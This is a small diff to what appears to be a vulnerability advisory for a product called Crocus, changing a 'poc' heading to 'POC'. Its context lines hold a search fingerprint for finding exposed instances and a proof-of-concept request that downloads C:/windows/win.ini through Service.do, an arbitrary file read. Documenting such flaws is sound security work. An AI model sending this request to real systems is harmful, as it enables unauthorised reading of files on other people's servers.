@@ -8,7 +8,7 @@
 body="/ThirdResource/respond/respond.min.js" && title="Crocus"
 ```
 
-## poc
+## POC
 
 ```
 GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
